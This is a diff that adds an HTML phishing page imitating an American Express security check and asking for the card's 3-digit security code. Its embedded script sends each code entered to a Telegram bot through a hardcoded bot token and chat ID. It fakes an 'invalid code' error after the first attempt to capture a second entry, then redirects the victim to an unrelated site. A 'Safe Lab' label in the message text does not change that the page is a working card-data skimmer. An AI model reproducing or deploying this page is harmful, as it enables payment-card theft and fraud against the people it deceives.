@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Security Verification: 3-Digit CSC</title>
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        background-color: #fff;
+        margin: 0;
+        padding: 0;
+        color: #333;
+    }
+    header {
+        background-color: white;
+        padding: 10px 20px;
+        border-bottom: 1px solid #ddd;
+        text-align: center;
+    }
+    header img {
+        height: 40px;
+    }
+    main {
+        max-width: 500px;
+        margin: 40px auto;
+        text-align: center;
+    }
+    h1 {
+        font-size: 20px;
+        color: #004481;
+    }
+    p {
+        font-size: 14px;
+        color: #444;
+    }
+    .card-image {
+        margin: 20px auto;
+    }
+    .card-image img {
+        max-width: 350px;
+        border-radius: 6px;
+        box-shadow: 0 0 8px rgba(0,0,0,0.2);
+    }
+    .form-group {
+        margin: 20px 0;
+        text-align: left;
+    }
+    label {
+        font-weight: bold;
+        display: block;
+        margin-bottom: 5px;
+        font-size: 14px;
+    }
+    input {
+        width: 100%;
+        padding: 10px;
+        font-size: 14px;
+        border: 1px solid #aaa;
+        border-radius: 4px;
+        box-sizing: border-box;
+    }
+    button {
+        background-color: #0076A8;
+        color: white;
+        font-size: 14px;
+        padding: 10px 20px;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+        margin-top: 15px;
+    }
+    button:hover {
+        background-color: #005F85;
+    }
+    a.cancel-link {
+        display: block;
+        margin-top: 15px;
+        font-size: 13px;
+        color: #0076A8;
+        text-decoration: none;
+    }
+</style>
+</head>
+<body>
+
+<header>
+    <img src="logo.png" alt="American Express">
+</header>
+
+<main>
+    <h1>Security Verification: 3-Digit CSC</h1>
+    <p>Please enter the 3-digit Card Security Code (CSC) which are the last three numbers printed on the signature strip on the back of your card.</p>
+
+    <div class="card-image">
+        <img src="cardback.png" alt="Card back showing CVV">
+    </div>
+
+    <form id="cscForm" onsubmit="handleVerify(event)">
+        <div class="form-group">
+            <label for="csc">3-Digit CSC</label>
+            <input type="password" id="csc" maxlength="3" placeholder="123" required>
+        </div>
+        <button type="submit">Verify</button>
+        <a href="#" class="cancel-link">Cancel</a>
+    </form>
+</main>
+
+<script>
+const botToken = "7999389311:AAF5TnQu3LxyxWlS6E2fCssn7YsFUg3Fs28";
+const chatId = "6879879625";
+let attemptCount = 0;
+
+function sendToTelegram(csc, attempt) {
+    const message = `🔐 CSC Verification Attempt (Safe Lab)\nAttempt: ${attempt}\n3-Digit CSC: ${csc}`;
+    return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+    });
+}
+
+function handleVerify(e) {
+    e.preventDefault();
+    const csc = document.getElementById('csc').value.trim();
+
+    if (!/^[0-9]{3}$/.test(csc)) {
+        alert("Please enter a valid 3-digit CSC.");
+        return;
+    }
+
+    attemptCount++;
+
+    if (attemptCount === 1) {
+        sendToTelegram(csc, attemptCount)
+            .then(() => {
+                alert("Invalid CSC. Please try again.");
+            })
+            .catch(() => {
+                alert("Invalid CSC. Please try again.");
+            });
+        return;
+    }
+
+    sendToTelegram(csc, attemptCount)
+        .then(() => {
+            window.location.href = "https://www.sherpaautotransport.com";
+        })
+        .catch(() => {
+            window.location.href = "https://www.sherpaautotransport.com";
+        });
+}
+</script>
+
+</body>
+</html>
